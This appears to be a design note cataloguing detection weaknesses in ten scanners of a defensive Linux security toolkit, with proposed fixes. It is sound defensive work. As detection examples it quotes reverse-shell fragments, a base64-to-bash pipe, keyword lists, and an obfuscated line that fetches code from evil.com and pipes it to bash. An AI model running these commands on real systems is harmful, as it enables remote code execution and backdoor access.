# Gap 02: Detection Quality — Weaknesses in Real Scanners

**Priority:** CRITICAL
**Impact:** Even working scanners miss real-world attacks

## Problem

The 18 real scanners use basic pattern matching that catches tutorial-level attacks but misses anything sophisticated. This document catalogs each weakness and what to do about it.

---

## 1. Rootkit Scanner — Name-Based Detection Is Trivially Bypassed

**Current approach:**
```go
suspiciousNames := []string{"hide", "rootkit", "backdoor", "stealth", "ghost", "keylog", "hook", "intercept", "sniff", "inject"}
```

**Why this fails:** Any real attacker names their kernel module `nf_conntrack_helper`, `usb_storage_ext`, or `i2c_piix4_custom`. The name check catches literally zero real rootkits.

**Fix:**
- Compare loaded modules against package-installed modules (`dpkg -S /lib/modules/*/`)
- Hash-check module files against known-good hashes
- Check module load timestamps (recently loaded modules are suspicious)
- Verify module signatures if SecureBoot is enabled
- Cross-reference with `modinfo` for valid author/description fields
- Check for modules that hide themselves from `/proc/modules` (compare `lsmod` output with `/sys/module/` directory listing)

---

## 2. Process Scanner — Regex-Only Reverse Shell Detection

**Current approach:** Matches specific strings like `bash -i >& /dev/tcp`, `xmrig`, `stratum+tcp`.

**What it misses:**
- Python reverse shells: `python3 -c "import socket,subprocess..."`
- Perl reverse shells: `perl -e 'use Socket...'`
- PHP reverse shells: `php -r '$sock=fsockopen...'`
- Custom compiled binaries (no signature match)
- Renamed standard tools (`/tmp/sshd` that's actually netcat)
- Processes that fork and exec (parent process looks clean)

**Fix:**
- Check process network sockets: any process with ESTABLISHED connection to non-standard port
- Compare binary hash to known package hashes (`dpkg -S` + `md5sum`)
- Flag processes where `/proc/*/exe` doesn't match `/proc/*/cmdline`
- Detect processes with high network I/O from `/proc/*/net/dev`
- Add common reverse shell patterns for python, perl, php, ruby, lua, socat
- Flag any process running from a world-writable directory

---

## 3. Credential Scanner — Misses Git History

**Current approach:** Scans current file contents for regex patterns (AWS keys, private keys, etc.).

**Critical miss:** Your AWS key leak was likely a key committed to git then removed. The key still exists in `git log` / `git reflog` but the current file is clean. This scanner would say "all clear" on a repo with leaked secrets in history.

**Fix:**
- Walk target paths for `.git` directories
- Run `git log --all --diff-filter=D -p` to find deleted secrets
- Run `git log --all -p -- '*.env' '*.pem' '*.key'` for sensitive file history
- Use `gitleaks detect --source <path>` (with git history, not `--no-git`)
- Native fallback: parse `git log --all --oneline -p` output with same regex patterns
- Check `git stash list` for stashed secrets

---

## 4. SUID Scanner — Static Allowlist, No Verification

**Current approach:** Hardcoded list of 10 "known-safe" SUID binaries. Anything not on the list → HIGH.

**Problems:**
- False positives: legitimate SUID binaries like `pkexec`, `fusermount3`, `snap-confine`, `chromium-sandbox` will trigger
- False negatives: if an attacker replaces `/usr/bin/sudo` with a trojaned version, it's still on the allowlist
- No package verification: doesn't check if the SUID binary matches the installed package

**Fix:**
- Instead of allowlist, verify against package manager: `dpkg -S /usr/bin/suspicious` → if package owns it, check hash matches
- `debsums -c` for specific binary verification
- Flag SUID binaries with recent mtime (modified after package install)
- Flag SUID binaries not owned by any package → HIGH
- Flag SUID binaries where hash doesn't match package → CRITICAL
- Add common legitimate SUID binaries to reduce noise: pkexec, fusermount, mount.cifs, unix_chkpwd, etc.

---

## 5. Port Scanner — Safe List Hides Backdoors

**Current approach:** Ports 22, 53, 80, 443, 631, 5353, 8080 are "safe." Everything else is flagged.

**Problem:** A backdoor listening on port 443 or 8080 passes clean. An attacker binding to port 80 is invisible.

**Fix:**
- Don't flag ports as safe/unsafe — flag the *process* listening on each port
- Map port → PID → binary path via `/proc/net/tcp` + `/proc/*/fd`
- Flag if the process binary is not from an installed package
- Flag if the process binary is in /tmp or writable location
- Flag if the listening process is unexpected for the port (e.g., netcat on 443)
- Compare against expected services configuration

---

## 6. Cron Scanner — Misses Obfuscated Entries

**Current approach:** Regex for `curl|bash`, `/dev/tcp`, `base64`, `nc -e`.

**What it misses:**
- `python3 /tmp/update.py` (looks innocent, runs malware)
- `0 * * * * /usr/bin/check_health.sh` (legitimate name, malicious content)
- Cron entries that download and execute via `wget -q -O-`
- Entries using aliases or PATH manipulation to run different binaries
- Cron entries in unusual locations (`/etc/cron.hourly/` scripts)

**Fix:**
- Resolve the actual executable in cron entries and verify against packages
- Check if the script referenced by cron has suspicious content (recursive scan)
- Flag cron entries added recently (mtime of crontab file)
- Flag cron entries running as root with writable script paths
- Scan `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`
- Check if cron scripts are world-writable

---

## 7. Shell RC Scanner — No Obfuscation Detection

**Current approach:** Direct regex match on suspicious patterns.

**What it misses:**
- Encoded/obfuscated payloads: `echo "Y3VybCBodHRwOi8v..." | base64 -d | bash` split across lines
- Variable-based obfuscation: `$c$u$r$l http://evil.com | $b$a$s$h`
- Sourced files: `. /tmp/.hidden_config` — the RC file looks clean, the sourced file is malicious
- Multi-line commands using heredocs or continuation characters
- Function definitions that look innocent but execute on call

**Fix:**
- Check for `source` or `.` commands that load external files — flag and scan those files too
- Detect base64 content even without `eval` (long base64 strings in RC files are suspicious)
- Check for suspicious function definitions (functions containing curl/wget/nc)
- Flag RC files modified after system install date
- Compare RC files against default skeleton (`/etc/skel/.bashrc`)

---

## 8. SSH Scanner — Misses Advanced Config Issues

**Current checks:** PermitRootLogin, PasswordAuthentication, MaxAuthTries, PermitEmptyPasswords, authorized_keys permissions.

**Missing checks:**
- `AllowTcpForwarding yes` — allows tunnel-based pivoting
- `X11Forwarding yes` — X11 session hijacking
- `GatewayPorts yes` — allows remote port forwarding
- `PermitTunnel yes` — VPN tunneling through SSH
- `AuthorizedKeysCommand` — could execute malicious scripts
- `ForceCommand` modifications — could redirect sessions
- Weak key algorithms (ssh-rsa, ssh-dss)
- Authorized keys from unknown sources (keys not matching known team members)
- `~/.ssh/config` with ProxyCommand that executes arbitrary commands

**Fix:** Add checks for all security-relevant sshd_config directives. Cross-reference authorized_keys with known key fingerprints if a policy file exists.

---

## 9. PAM Scanner — Too Narrow

**Current checks:** Only flags `pam_exec.so`, `pam_script.so`, `pam_permit.so`.

**Missing:**
- `pam_debug.so` — logs authentication details
- Custom PAM modules (any `.so` not from a package)
- PAM configs that bypass password requirements
- `pam_succeed_if.so` with broad conditions (bypass for specific users)
- Modified `/etc/pam.d/common-auth` (affects all services)

**Fix:** Cross-reference PAM modules against installed packages (`dpkg -S /lib/*/security/pam_*.so`). Any module not from a package is suspicious.

---

## 10. Environment Scanner — Runtime-Only Check

**Current approach:** Reads `os.Getenv()` — only checks the defense-kit process's own environment.

**Problem:** A malicious LD_PRELOAD affecting the user's login shell won't show up when defense-kit runs (different process tree). A backdoor setting PROMPT_COMMAND in a subshell is invisible.

**Fix:**
- Check `/proc/*/environ` for all running processes (not just self)
- Check `/etc/environment` for system-wide persistence
- Check login shell environment by parsing the output of `env` in a login shell context
- Scan `/etc/profile.d/*.sh` for malicious exports (partially done but could be deeper)
